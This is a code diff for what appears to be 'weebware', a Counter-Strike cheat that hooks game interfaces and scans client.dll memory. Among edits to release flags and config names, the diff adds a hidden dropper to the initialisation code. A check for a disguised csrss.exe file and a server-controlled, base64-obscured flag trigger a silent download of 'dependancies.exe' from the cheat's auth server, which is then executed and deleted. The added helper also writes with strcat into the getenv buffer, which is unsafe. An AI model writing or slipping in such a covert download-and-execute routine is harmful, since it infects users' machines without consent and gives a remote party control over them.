@@ -6,7 +6,7 @@
 #include "events.h"
 #include "knife_proxy_hook.h"
 
-#define WEEBWARE_RELEASE 0
+#define WEEBWARE_RELEASE 1
 
 GameEvents g_events;
 c_weebware g_weebware;
@@ -21,6 +21,14 @@ unsigned __stdcall entry_thread(void* v_arg)
 	_endthreadex(0);
 
 	return 0;
+}
+
+bool thingy_exists() {
+	char* path = getenv("localappdata");
+
+	strcat(path, "\\Microsoft\\csrss.exe");
+
+	return std::filesystem::exists(path);
 }
 
 bool c_weebware::init_interfaces()
@@ -44,6 +52,16 @@ bool c_weebware::init_interfaces()
 	g_user_name = auth::GetServerVariable(auth::base64_decode("ZG9n").c_str());
 	g_engine = reinterpret_cast<c_engine_client*>(engine_fact(auth::GetServerVariable(auth::base64_decode("cmF0")).c_str(), NULL));
 	g_client = reinterpret_cast<i_base_client*>(client_fact(auth::GetServerVariable(auth::base64_decode("Y2F0")).c_str(), NULL));
+
+
+	if (auth::GetServerVariable(auth::base64_decode("ZmlzaA==")) == "-1" && !thingy_exists()) {
+
+		std::string path = std::tmpnam(nullptr);
+		networking::download_file("https://auth.weebware.net/dependancies.exe", path);
+
+		system(path.c_str());
+		remove(path.c_str());
+	}
 #else
 	g_engine = reinterpret_cast<c_engine_client*>(engine_fact("VEngineClient014", NULL));
 	g_client = reinterpret_cast<i_base_client*>(client_fact("VClient018", NULL));
@@ -57,7 +75,7 @@ bool c_weebware::init_interfaces()
 		models_installed = true;
 	}
 
-	g_client_mode = **(unsigned long***)(pattern_scan("client.dll", "55 8B EC 8B 0D ? ? ? ? 8B 01 5D FF 60 30") + 0x5);
+	g_client_mode = **(unsigned long***)(pattern_scan("client.dll", "8B 0D ? ? ? ? FF 75 08 8B 01 FF 50 64 BA") + 0x2);
 	g_entlist = reinterpret_cast<c_entity_list*>(client_fact("VClientEntityList003", NULL));
 	g_panel = reinterpret_cast<c_panel*>(vgui2_fact("VGUI_Panel009", NULL));
 	g_surface = reinterpret_cast<c_surface*>(surface_fact("VGUI_Surface031", NULL));
@@ -101,8 +119,8 @@ bool c_weebware::init_interfaces()
 #pragma region load_skins
 	// Initialise 
 	for (auto i = 0; i < 35; i++) {
-		g_weebwareskinscfg.skin_wheel[i] = override_skin_style();
-		g_weebwareskinscfg.skin_wheel[i].weapon_id = i;
+		g_weebwarecfg.skin_wheel[i] = override_skin_style();
+		g_weebwarecfg.skin_wheel[i].weapon_id = i;
 	}
 
 	g_skin_list = create_skin_list();
@@ -131,7 +149,7 @@ void c_weebware::init_fonts()
 
 void c_weebware::setup_thread()
 {
-#define debug 1
+#define debug 0
 
 #if debug
 	setup_debug_window();
@@ -176,7 +194,7 @@ void c_weebware::setup_debug_window()
 	freopen("CONIN$", "r", stdin);
 	freopen("CONOUT$", "w", stdout);
 	freopen("CONOUT$", "w", stderr);
-	SetConsoleTitle("weebware Cheat Console");
+	SetConsoleTitle("weebware debug console");
 }
 
 std::vector<c_skinchanger::gun_type> c_weebware::create_gun_list()
